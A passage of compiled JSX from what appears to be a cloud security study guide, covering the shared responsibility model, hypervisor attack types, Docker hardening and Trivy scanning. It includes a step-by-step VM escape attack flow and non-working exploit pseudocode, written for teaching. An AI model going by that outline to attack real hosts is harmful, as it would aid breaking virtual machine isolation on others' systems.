          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Networking"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Physical Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Dry Run — Responsibility Decision Flow:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Input: App deployment scenario (Web app on AWS)\n1. Is it bare metal? ? On-prem (you own everything)\n2. Is it EC2? ? IaaS (you patch OS, provider secures hypervisor)\n3. Is it Elastic Beanstalk? ? PaaS (provider patches OS, you patch app)\n4. Is it an S3-hosted static site? ? SaaS-like (provider secures storage)\n5. Is it WorkDocs? ? SaaS (provider secures everything, you control access)\nOutput: Responsibility assignment matrix\n\nComplexity: O(1) — direct classification\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "edge-cases",
      children: "Edge Cases"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Container services (EKS, AKS, GKE):"
        }), " Hybrid model — provider secures control plane, customer secures worker nodes, pods, and container runtime. Responsibility boundary is at the Kubernetes API server."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Serverless (Lambda, Functions):"
        }), " Provider secures execution environment, customer secures function code, dependencies, and IAM permissions. Cold-start containers are provider-managed."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Shared VPC (GCP Hosted Projects):"
        }), " Host project owner secures networking, service project owner secures resources. Split responsibility model."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "cloud-shared-responsibility-model",
      children: "Cloud Shared Responsibility Model"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "deep-dive--the-six-layers-of-cloud-security",
      children: "Deep Dive — The Six Layers of Cloud Security"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Layer 1: Physical Security (CSP only)\n+-- Data center perimeter\n+-- Surveillance, guards, biometrics\n+-- Redundant power / cooling\n\nLayer 2: Infrastructure Security (CSP only)\n+-- Network segmentation\n+-- Hypervisor hardening\n+-- Storage encryption at rest (provider-managed keys)\n\nLayer 3: Platform Security (split)\n+-- CSP: Runtime environment, managed services\n+-- Customer: IAM roles, service configuration\n\nLayer 4: Application Security (customer)\n+-- Secure coding\n+-- Dependency scanning\n--- API gateway configuration\n+-- Secrets management\n\nLayer 5: Data Security (customer)\n+-- Encryption (KMS, HSM)\n+-- Access control policies\n+-- Backup / DR\n\nLayer 6: Governance & Compliance (shared)\n+-- CSP: Certifications (SOC 2, ISO 27001, FedRAMP)\n+-- Customer: Compliance in the cloud (CIS benchmarks, config rules)\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Real-World Analogy:"
      }), " A bank safety deposit box. The bank secures the vault, the building, and the guards (Security ", (0,jsx_runtime.jsx)(_components.em, {
        children: "of"
      }), " the Cloud). You secure your key and what you put in the box (Security ", (0,jsx_runtime.jsx)(_components.em, {
        children: "in"
      }), " the Cloud). If you leave your box unlocked, the bank isn't responsible."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Numbered Steps — Determining Responsibility:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Identify the service model (IaaS/PaaS/SaaS) from the deployment type."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Consult the provider's Shared Responsibility Matrix (SRM) document."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "For each resource category (compute, storage, network, data, identity), check who has configuration access."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "If you can change it, you're responsible for securing it."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Document the boundary in an internal RACI matrix."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Automate compliance checks using CSPM tools (AWS Config, Azure Policy, GCP CSPM)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Re-assess when migrating between service models or adding new services."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "A&D Table — Shared Responsibility Model:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Aspect"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Advantages"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Disadvantages"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Clarity"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Clear accountability boundaries"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Boundary can blur with managed services (EKS, Lambda)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Flexibility"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer controls what they can secure"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer must have cloud security expertise"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Automation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CSPM tools automate compliance checks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Misconfiguration still possible"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Cost"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No capital expenditure on infra"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unexpected costs from data egress"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Scalability"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider handles infinite scale"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer must architect for scale correctly"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Edge Cases:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "AWS Fargate:"
        }), " Provider manages the runtime and OS; customer manages task definitions, IAM roles, and container images. The boundary is at the container runtime level."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "GCP Cloud Run:"
        }), " Fully managed Knative — provider patches underlying K8s, customer secures service account permissions and container images."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Azure AD B2C:"
        }), " Provider secures the identity platform; customer configures user flows, attribute collection, and API connectors. Shared responsibility for user data."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "virtualization-security",
      children: "Virtualization Security"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "hypervisor-based-virtualization",
      children: "Hypervisor-Based Virtualization"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " An apartment building with a super-strict landlord. The hypervisor is the landlord who ensures tenants (VMs) stay in their own apartments and don't peek into each other's windows. If the landlord goes rogue or gets compromised, every apartment is exposed."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "hypervisor-attack-surfaces",
      children: "Hypervisor Attack Surfaces"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Attack Type"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Real-World Example"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "VM Escape"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Guest breaks out of VM to access hypervisor or host"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CVE-2019-2523 (Xen escape)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "VM Sprawl"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Uncontrolled VM creation leading to management gaps"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Shadow IT VMs without patches"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Hyperjacking"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Malicious hypervisor installed under the OS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Blue Pill rootkit"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Side-Channel"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Guest observes host or other guests via shared resources"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Spectre/Meltdown (cross-VM cache leaks)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "VM Hopping"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Guest accesses another guest via shared memory"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Memory deduplication attacks"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "vm-escape--detailed-walkthrough",
      children: "VM Escape — Detailed Walkthrough"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Step-by-Step Attack Flow:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Attacker gains code execution inside a guest VM (e.g., via web app RCE)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Attacker probes the hypervisor interface via CPU instructions (cpuid, vmcall)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Attacker identifies hypervisor type and version (VMware, Xen, KVM)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Attacker exploits a hypervisor vulnerability to break out of the VM."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Attacker gains arbitrary code execution on the host OS."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Attacker accesses other VMs on the same host or the hypervisor control layer."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Pseudocode — VM Escape Exploit Concept:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "// Concept — DO NOT USE MALICIOUSLY\nfunction attemptVmEscape():\n    # Step 1: Detect hypervisor\n    if cpuid(hypervisor_present) == true:\n        hypervisor_type = cpuid(hypervisor_signature)\n    # Step 2: Probe for vulnerability\n    for vuln in known_hypervisor_vulns:\n        if test_vulnerability(vuln) == true:\n    # Step 3: Trigger the exploit\n            shellcode = craft_escape_shellcode()\n            execute_exploit(vuln, shellcode)\n    # Step 4: Check if escaped\n            if access_host_memory() == true:\n                return \"ESCAPED\"\n    return \"FAILED\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Complexity Analysis:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Detection phase:"
        }), " O(1) — single CPUID instruction"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Vulnerability probing:"
        }), " O(n) where n = number of known CVEs"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Exploit execution:"
        }), " Depends on exploit complexity"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Memory access after escape:"
        }), " O(1) once kernel access gained"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "vm-sprawl-security-risks",
      children: "VM Sprawl Security Risks"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Risk"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Impact"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Mitigation"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Unpatched VMs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Known exploit vectors"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "VM lifecycle management, patch automation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Orphaned VMs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Data leakage"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Tagging, automated cleanup, CMDB"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Configuration drift"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Compliance violation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Infrastructure as Code (IaC)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Licensing non-compliance"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Financial/Legal"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CloudHealth, AWS License Manager"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Ghost VMs (unauthorized)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hidden attack surface"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud inventory scanning (AWS Config)"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Edge Cases:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Nested virtualization:"
        }), " Running a hypervisor inside a VM (common for training, containers-on-VM). Additional isolation concerns — can be exploited for hyperjacking."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Hardware pass-through (PCIe, GPU):"
        }), " Direct device assignment bypasses hypervisor mediation. Malicious DMA attacks possible without IOMMU."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Memory ballooning:"
        }), " Hypervisor reclaims guest memory — potential information leak if memory isn't zeroed before reassignment."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "ad-table--virtualization-security",
      children: "A&D Table — Virtualization Security"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Aspect"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Advantages"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Disadvantages"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Isolation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Strong hardware-enforced isolation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Vulnerable to side-channel attacks"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Utilization"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Over-provisioning saves cost"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Resource contention can lead to DoS"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Live Migration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Zero-downtime maintenance"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Migration exposes memory contents in transit"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Snapshots"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Quick recovery"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Snapshots can expose old credentials (Golden VM attack)"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "container-security",
      children: "Container Security"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "docker-security",
      children: "Docker Security"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " Shipping containers in a port. Each container is sealed and isolated, but they all sit on the same ship (host kernel). If you leave your container unlocked or put dangerous cargo inside (insecure images, secrets in ENV), the entire ship is at risk."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "docker-security-best-practices",
      children: "Docker Security Best Practices"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Practice"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Command/Config"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Run as non-root"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: ["Avoid ", (0,jsx_runtime.jsx)(_components.code, {
              children: "USER root"
            }), " in Dockerfile"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "USER appuser"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Read-only rootfs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Prevent container modifications"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.code, {
              children: "--read-only"
            }), " flag"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Drop capabilities"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Remove unnecessary Linux capabilities"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "--cap-drop ALL --cap-add NET_BIND_SERVICE"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Use seccomp"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Restrict available syscalls"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "--security-opt seccomp=default.json"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Use AppArmor"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "MAC profile for containers"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "--security-opt apparmor=my-profile"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "No privileged mode"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Never use --privileged"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "docker run --security-opt no-new-privileges"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Image scanning"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Scan for known CVEs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "trivy image nginx:latest"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Minimal base image"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Reduce attack surface"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "FROM alpine:3.18"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Content trust"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Verify image signatures"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "export DOCKER_CONTENT_TRUST=1"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Secret management"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Never bake secrets into images"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.code, {
              children: "docker secret"
            }), " or env vars from Vault"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Logging"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Enable audit logging"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Docker daemon log-driver: json-file"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Resource limits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Prevent resource exhaustion"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "--memory=\"512m\" --cpus=\"0.5\""
            })
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Secure Dockerfile Example:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-dockerfile",
        children: "FROM alpine:3.18 AS build\nRUN apk add --no-cache gcc musl-dev\nCOPY src/ /src/\nRUN gcc -o /app/myapp /src/main.c\n\nFROM alpine:3.18\nRUN addgroup -S appgroup && adduser -S appuser -G appgroup\nCOPY --from=build /app/myapp /app/myapp\nUSER appuser\nWORKDIR /app\nEXPOSE 8080\nENTRYPOINT [\"/app/myapp\"]\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "docker-bench-security Audit:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Run Docker CIS benchmark\ndocker run --pid=host --net=host --cap-add=audit_control \\\n  -v /var/lib:/var/lib:ro -v /var/run/docker.sock:/var/run/docker.sock:ro \\\n  -v /etc:/etc:ro docker/docker-bench-security\n\n# Sample output (pass/fail for each test):\n# [WARN] 2.1 - Ensure network traffic is restricted between containers\n# [INFO] 2.2 - Ensure the logging level is set to 'info'\n# [PASS] 4.1 - Ensure a user for the container has been created\n# [FAIL] 5.4 - Ensure privileged containers are not used\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Complexity Analysis — Docker Security:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "docker-bench-security scan:"
        }), " O(n) where n = number of test checks (~100 checks)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Image vulnerability scan (Trivy):"
        }), " O(p + v) where p = packages, v = vulnerability DB entries"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "seccomp profile filtering:"
        }), " O(1) per syscall — kernel overhead at syscall boundary"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "trivy-container-image-scanning",
      children: "Trivy Container Image Scanning"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Install Trivy (Windows)\nchoco install trivy\n\n# Scan an image for vulnerabilities\ntrivy image nginx:1.21.6\n\n# Scan with severity filter and output formats\ntrivy image --severity CRITICAL,HIGH --format json -o nginx-scan.json nginx:1.21.6\ntrivy image --severity MEDIUM --format sarif -o nginx-sarif.json nginx:1.21.6\n\n# Scan container filesystem\ntrivy filesystem --severity HIGH /path/to/container/rootfs\n\n# Scan a Kubernetes cluster\ntrivy k8s cluster --severity CRITICAL\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Dry Run — Trivy Scan Output Interpretation:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
